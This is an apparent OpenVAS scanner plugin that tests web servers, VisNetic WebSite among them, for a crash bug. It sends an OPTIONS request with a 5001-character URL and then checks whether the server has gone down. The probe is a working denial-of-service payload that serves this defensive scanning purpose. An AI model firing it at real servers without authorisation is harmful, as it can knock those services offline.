if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11235" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_name( "Too long OPTIONS parameter" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your web server." );
	script_tag( name: "summary", value: "It may be possible to make the web server crash or even
  execute arbitrary code by sending it a too long url through the OPTIONS method." );
	script_tag( name: "affected", value: "VisNetic WebSite 3.5.13.1. Other versions or products
  might be affected as well." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port, retry: 4 )){
	exit( 0 );
}
req = http_get( port: port, item: "/" + crap( 5001 ) + ".html" );
req = ereg_replace( string: req, pattern: "^GET", replace: "OPTIONS" );
http_send_recv( port: port, data: req );
sleep( 5 );
if(http_is_dead( port: port, retry: 4 )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

